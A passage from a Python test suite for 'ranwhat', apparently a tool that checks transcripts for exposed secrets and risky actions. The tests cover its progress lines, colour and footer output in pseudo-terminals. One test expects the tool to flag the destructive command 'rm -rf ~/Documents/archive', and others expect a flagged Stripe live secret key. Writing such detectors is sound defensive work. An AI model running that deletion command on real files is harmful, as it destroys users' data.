        self.assertEqual(WATCH_PLAIN.split("\n").count(FOOTER), 1)
        self.assertEqual(CLEAN_PLAIN.split("\n").count(FOOTER), 1)

    @PINNED_ZONE
    def test_gates_drop_only_their_lines(self):
        w = watch.render([REC], 1, 30, footer=False)
        self.assertEqual(w + "\n" + RULE + "\n" + FOOTER + "\n", WATCH_PLAIN)
        c = clean.render(FIND, 1, [], False, footer=False, advice=False)
        self.assertEqual(c + "\n", CLEAN_PLAIN.split("  Dry run.")[0])
        self.assertIn(ROTATE, c)
        self.assertIn("  * Synthetic key", c)

    def test_standalone_cli_keeps_advice_and_footer(self):
        root, _ = make_root(SECRET)
        _, out, _ = self.run_cli(["clean", "--no-interactive", "--root", root])
        lines = self.lines(out)
        self.assertIn("  Dry run. Nothing was changed.", lines)
        for line in ADVICE:
            self.assertIn(line, lines)
        self.assertEqual(lines.count(FOOTER), 1)
        root, st = make_root(ACTION)
        _, out, _ = self.run_cli(["watch", "--root", root, "--state-dir", st])
        self.assertEqual(self.lines(out).count(FOOTER), 1)

    @unittest.skipIf(os.name == "nt", "pseudo-terminals are POSIX only")
    def test_colour_in_a_pty(self):
        code = ("import sys\nfrom ranwhat import watch, clean\n"
                "REC = %r\nFIND = %r\n"
                "sys.stdout.write(watch.render([REC], 1, 30) + '|'"
                " + clean.render(FIND, 1, [], False))\n" % (REC, FIND))
        raw = _pty_run([sys.executable, "-c", code],
                       {"TERM": "xterm-256color"}, 80)
        watched, cleaned = raw.replace("\r\n", "\n").split("|")
        self.assertEqual(watched, WATCH_COLOUR)
        self.assertEqual(cleaned, CLEAN_COLOUR)


def _pty_run(argv, env_extra, cols):
    """Run argv with stdin/stdout/stderr all on a pty of `cols` columns."""
    import fcntl
    import struct
    import termios
    pid, fd = pty.fork()
    if pid == 0:
        try:
            env = dict(os.environ, RANWHAT_WIDTH=WIDTH, PYTHONPATH=REPO,
                       **env_extra)
            env.pop("NO_COLOR", None)
            os.chdir(REPO)
            os.execve(argv[0], argv, env)
        finally:
            os._exit(127)
    fcntl.ioctl(fd, termios.TIOCSWINSZ, struct.pack("HHHH", 40, cols, 0, 0))
    data = b""
    while True:
        try:
            chunk = os.read(fd, 65536)
        except OSError:
            break
        if not chunk:
            break
        data += chunk
    os.waitpid(pid, 0)
    os.close(fd)
    return data.decode("utf-8", "replace")


def _screen(raw, cols):
    """What a terminal shows after these bytes: autowrap, CR, LF and EL."""
    rows, r, c, i = [[]], 0, 0, 0
    while i < len(raw):
        if raw.startswith("\033[K", i):
            del rows[r][c:]
            i += 3
            continue
        m = re.match(r"\033\[[0-9;]*m", raw[i:])
        if m:
            i += m.end()
            continue
        ch = raw[i]
        if ch == "\r":
            c = 0
        elif ch == "\n":
            r, c = r + 1, 0
            rows.append([]) if r == len(rows) else None
        else:
            if c >= cols:
                r, c = r + 1, 0
                rows.append([]) if r == len(rows) else None
            row = rows[r]
            row.extend(" " * (c - len(row)))
            if c < len(row):
                row[c] = ch
            else:
                row.append(ch)
            c += 1
        i += 1
    return ["".join(x) for x in rows]


@unittest.skipIf(os.name == "nt", "pseudo-terminals are POSIX only")
class RealTerminal(unittest.TestCase):

    def test_progress_shows_then_leaves_no_residue(self):
        root, st = make_root(ACTION + SECRET)
        argv = [sys.executable, "-m", "ranwhat", "check", "--root", root,
                "--state-dir", st]
        for cols in (80, 40):
            raw = _pty_run(argv, {"TERM": "xterm", "NO_COLOR": ""}, cols)
            # The index takes what the read for secrets found in the one
            # transcript, on the first run and after: it reads none itself.
            self.assertNotIn("indexing", raw)
            self.assertIn("looking for secrets 1/1", raw)
            self.assertIn("checking actions 1/1", raw)
            self.assertLess(raw.index("looking for secrets"), raw.index("checking actions"))
            last = raw.rindex("checking actions")
            self.assertIn("\r\033[K", raw[last:])
            self.assertNotIn(" " * 46, raw)
            rows = _screen(raw.replace("\r\n", "\n"), cols)
            self.assertEqual(rows[0], "", rows[:3])
            self.assertTrue(rows[1].startswith("  ranwhat watch"), rows[:3])
            self.assertEqual(sum(r == FOOTER for r in rows), 1)
            self.assertIn("Stripe live secret key", raw)

    def test_watch_shows_then_leaves_no_residue(self):
        root, st = make_root(ACTION + SECRET)
        argv = [sys.executable, "-m", "ranwhat", "watch", "--root", root,
                "--state-dir", st]
        for cols in (80, 40):
            raw = _pty_run(argv, {"TERM": "xterm", "NO_COLOR": ""}, cols)
            self.assertEqual("indexing secrets (first run) 1/1" in raw, cols == 80)
            self.assertIn("checking actions 1/1", raw)
            last = raw.rindex("checking actions")
            self.assertIn("\r\033[K", raw[last:])
            rows = _screen(raw.replace("\r\n", "\n"), cols)
            self.assertEqual(rows[0], "", rows[:3])
            self.assertTrue(rows[1].startswith("  ranwhat watch"), rows[:3])
            self.assertIn("rm -rf ~/Documents/archive", raw)

    def test_narrow_stderr_with_stdout_redirected(self):
        # shutil.get_terminal_size() measures stdout, which here is a file,
        # so it answers 80; the line must be cut to the 20-column stderr.
        import fcntl
        import struct
        import termios
        root, st = make_root(ACTION + SECRET)
        master, slave = pty.openpty()
        fcntl.ioctl(slave, termios.TIOCSWINSZ, struct.pack("HHHH", 24, 20, 0, 0))
        env = dict(os.environ, TERM="xterm", PYTHONPATH=REPO)
        env.pop("COLUMNS", None)
        with tempfile.TemporaryFile() as out:
            proc = subprocess.Popen(
                [sys.executable, "-m", "ranwhat", "check", "--root", root,
                 "--state-dir", st],
                stdin=subprocess.DEVNULL, stdout=out, stderr=slave, cwd=REPO,
                env=env)
            os.close(slave)
            raw = b""
            while True:
                try:
                    chunk = os.read(master, 65536)
                except OSError:
                    break
                if not chunk:
                    break
                raw += chunk
            proc.wait()
            os.close(master)
            out.seek(0)
            report = out.read().decode()
        err = raw.decode()
        self.assertIn("\r  checking actions \033[K", err)
        self.assertIn("\r  looking for secre\033[K", err)
        for piece in err.replace("\033[K", "").split("\r"):
            self.assertLessEqual(len(piece), 19, repr(err))
        self.assertEqual([r for r in _screen(err, 20) if r], [])
        self.assertIn("Stripe live secret key", report)


if __name__ == "__main__":
    unittest.main(verbosity=2)
